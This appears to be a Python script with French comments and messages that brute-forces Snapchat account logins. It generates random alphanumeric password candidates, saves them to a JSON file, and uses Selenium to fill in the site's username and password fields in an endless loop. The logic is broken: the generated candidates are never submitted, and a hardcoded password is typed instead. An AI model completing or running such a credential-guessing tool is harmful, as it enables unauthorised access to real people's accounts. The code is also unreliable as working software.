import requests
import string
import random
import time
import easyjson
from easyjson import core
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from bs4 import BeautifulSoup

chemin = "main.json"

email = ""

url = "https://snapchat.com"

def test_unit() -> str:
    req = requests.get(url)

    if req.status_code == 200:
        print("Envoie reussi no proxy")

    else:
        raise

def bruteforcing():
    caracteres = string.ascii_letters + string.digits

    longueur = random.randint(7, 12)
    combinaison = ''.join(random.choices(caracteres, k=longueur))

    print(combinaison)

    easyjson.append(chemin, combinaison)

    time.sleep(0.1)

def scrap() -> int | str:
    driver = webdriver.Chrome()
    driver.get(url)

    wait = WebDriverWait(driver, 15)

    input_element = wait.until(
        EC.element_to_be_clickable((
            By.CSS_SELECTOR,
            'input[autocomplete="username"]'
        ))
    )
    input_element.click()
    input_element.clear()
    input_element.send_keys(email)

    submit_button = wait.until(
        EC.element_to_be_clickable((
            By.CSS_SELECTOR,
            'button[type="submit"]'
        ))
    )
    submit_button.click()
    time.sleep(3)
    page = driver.page_source
    result = password(driver)
    # driver.quit()
    return result

def password(driver) -> str | int | bool:
    wait = WebDriverWait(driver, 15)
    password_value = "abc29239239239"
    password_input = wait.until(
        EC.element_to_be_clickable((By.ID, "password"))
    )
    time.sleep(1.5)
    password_input.send_keys(password_value)
    password_input.send_keys(Keys.ENTER)
    time.sleep(1.5)
    driver.quit()
    # return driver.page_source

if __name__ == "__main__":
    while True:
        bruteforcing()
        scrap()